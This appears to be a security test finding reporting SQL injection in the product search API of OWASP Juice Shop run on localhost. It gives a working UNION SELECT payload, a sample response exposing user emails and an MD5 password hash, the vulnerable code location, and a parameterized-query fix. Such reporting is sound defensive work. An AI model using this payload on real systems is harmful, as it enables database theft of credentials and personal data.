SQL Injection in Product Search API
Critical Confirmed injection shannon
Shannon ID
INJ-VULN-01
Description
The product search endpoint at /rest/products/search?q= is vulnerable to SQL injection. The search query parameter is concatenated directly into a SQL query without parameterization, allowing an attacker to extract the full SQLite database contents including user credentials, credit card data, and security answers.
Proof of Concept
GET /rest/products/search?q=qwert'))UNION+SELECT+id,email,password, role,'5','6','7','8','9'FROM+Users-- HTTP/1.1 Host: localhost:3000 Response (200 OK): { "status": "success", "data": [ { "id": 1, "name": "admin@juice-sh.op", "description": "0192023a7bbd73250516f069df18b500", "price": "admin", ... }, { "id": 2, "name": "jim@juice-sh.op", "description": "e541f8ef8e710...", ... } ] }
Code Location
routes/search.ts:28
Remediation
Replace string concatenation with parameterized queries using Sequelize's built-in query binding. The vulnerable pattern models.sequelize.query("SELECT ... '" + criteria + "'") should use models.sequelize.query("SELECT ... ?", { replacements: [criteria] })
Tester Notes
Verified manually. Full database dump possible including password hashes (MD5, unsalted). Also works via the Angular search bar on the frontend. CVSS 9.8 confirmed.
